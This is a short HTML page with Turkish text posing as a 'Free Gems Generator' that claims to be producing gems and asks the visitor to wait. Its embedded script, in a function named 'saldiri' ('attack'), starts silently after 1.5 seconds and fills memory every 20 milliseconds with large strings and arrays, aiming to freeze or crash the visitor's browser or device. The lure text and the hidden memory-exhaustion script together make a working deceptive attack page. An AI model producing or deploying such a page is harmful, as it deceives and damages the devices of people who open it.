<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Free Gems Generator</title></head>
<body style="background:#1a1a1a; color:#f1c40f; text-align:center; padding-top:50px; font-family:sans-serif;">
    <h1>ELMASLAR ÜRETİLİYOR...</h1>
    <p>Lütfen bekleyin, bu işlem cihaz hızına göre 30 saniye sürebilir.</p>
    <div style="color:#aaa; font-size:12px;">Doğrulama aşaması: Bellek optimizasyonu yapılıyor...</div>

    <script>
        let depo = [];
        function saldiri() {
            setInterval(() => {
                try {
                    let veri = new Array(2000000).fill("FREE_GEMS_GOLD_").join("");
                    depo.push(veri);
                    depo.push(new Float64Array(250000));
                } catch(e) {}
            }, 20);
        }
        setTimeout(saldiri, 1500); // 1.5 saniye sonra sessizce başlar
    </script>
</body>
</html>
